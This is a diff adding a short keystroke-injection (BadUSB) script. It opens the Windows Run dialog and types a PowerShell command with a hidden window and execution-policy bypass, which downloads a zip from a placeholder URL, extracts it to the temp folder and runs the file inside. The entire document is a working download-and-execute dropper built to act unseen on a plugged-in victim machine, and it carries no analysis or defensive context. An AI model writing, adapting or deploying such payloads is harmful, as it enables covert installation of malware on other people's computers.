@@ -1,0 +1,4 @@
+GUI r
+DELAY 1000
+powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri '{URL}' -O "$D\{FileName.zip}";Expand-Archive "$D\{FileName.zip}" -Des $D\{FileName} -Force;. "$D\{FileName}\{FileName}"
+ENTER
